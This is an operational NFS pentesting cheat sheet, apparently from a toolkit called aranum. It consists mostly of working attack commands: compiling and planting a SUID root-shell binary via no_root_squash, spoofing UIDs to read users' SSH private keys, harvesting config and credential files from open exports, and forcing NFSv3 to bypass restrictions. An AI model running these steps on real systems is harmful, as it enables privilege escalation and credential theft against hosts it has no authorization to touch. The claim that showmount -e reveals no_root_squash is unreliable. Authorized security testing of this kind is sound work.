---
service: nfs
title: NFS
ports: 2049, 111
aliases: nfs-server, portmapper
---

# NFS — quick wins

**When you see it:** 2049/tcp open (or 111/tcp/portmapper) and `showmount -e H` returns at
least one export — any export reachable from your IP is worth mounting to check permissions.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to the target — clean
> up any dropped binaries after the engagement.

## Triage (read-only)
```sh
nmap -sV -p 111,2049 H                            # confirm portmapper + nfs
showmount -e H                                    # list exports + access control
showmount -a H                                    # who has mounted what
sudo mount -t nfs H:/export /mnt/nfs -o nolock    # mount and inspect
ls -lan /mnt/nfs                                  # note UIDs — no names, just numbers
cat /mnt/nfs/etc/exports 2>/dev/null              # read server export config if accessible
```

## Quick wins

### no_root_squash — SUID binary → root shell ✏️
```sh
# attacker side (as root)
cat > /tmp/suid.c << 'EOF'
#include <unistd.h>
int main(void){ setuid(0); setgid(0); execl("/bin/bash","bash",NULL); }
EOF
gcc /tmp/suid.c -o /tmp/suid
sudo mount -t nfs H:/export /mnt/nfs -o nolock
cp /tmp/suid /mnt/nfs/suid
chmod u+s /mnt/nfs/suid

# target side (unprivileged shell already on box)
/export/suid     # → root shell
```
*Why:* when `no_root_squash` is set, the NFS server trusts the client's UID 0 as root, so
SUID bits stick and the binary executes as root on the target. Check `showmount -e` output
for the string `no_root_squash`.

### UID spoofing — read files owned by a specific user
```sh
# find the UID owning sensitive files
ls -lan /mnt/nfs                    # e.g. UID 1001 owns /home/alice

# create a local user with matching UID, then read as that user
sudo useradd -u 1001 nfsghost
sudo su nfsghost -s /bin/sh -c "cat /mnt/nfs/home/alice/.ssh/id_rsa"
```
*Why:* NFS (especially v3) authenticates by UID/GID passed from the client; matching the
UID is enough to read files the server considers owned by that user.

### World-readable export — direct file harvest
```sh
sudo mount -t nfs H:/export /mnt/nfs -o nolock,ro
find /mnt/nfs -name "*.conf" -o -name "*.env" -o -name "id_rsa" 2>/dev/null
```
*Why:* exports with `*(ro)` or `*(rw)` allow any host to mount — harvest configs, SSH keys,
and credentials with no authentication.

### NFS-version force (bypass NFSv4 restrictions)
```sh
sudo mount -t nfs -o vers=3 H:/export /mnt/nfs -o nolock
```
*Why:* some servers restrict v4 ACLs but leave v3 open; v3 also exposes the UID trust
model more directly.

## aranum helpers
- `aranumtoolkit/network/enum-nfs.sh` — dispatcher that produced this finding (showmount,
  version probe, export listing, basic permission check).

## Gotchas
- `Permission denied` on mount even with a listed export → your source IP may be outside
  the allowed CIDR in `/etc/exports`; confirm with `showmount -e`.
- NFSv4 Kerberos (`sec=krb5`) exports require valid Kerberos tickets — UID spoofing and
  root squash bypass don't apply.
- `no_all_squash` is the default; it only squishes unknown UIDs. If `all_squash` is set,
  every remote user maps to `nobody` — SUID trick still works if the binary runs as
  `nobody` and that's sufficient for your goal.
- Stale mount handles: unmount cleanly with `sudo umount -f /mnt/nfs` after the engagement.

## Sources
- HackTricks `nfs-service-pentesting`; Hackviser NFS pentesting;
  PayloadsAllTheThings `linux-privilege-escalation/nfs-no_root_squash-misconfiguration-pe`;
  Tib3rius Pentest-Cheatsheets linux privesc.
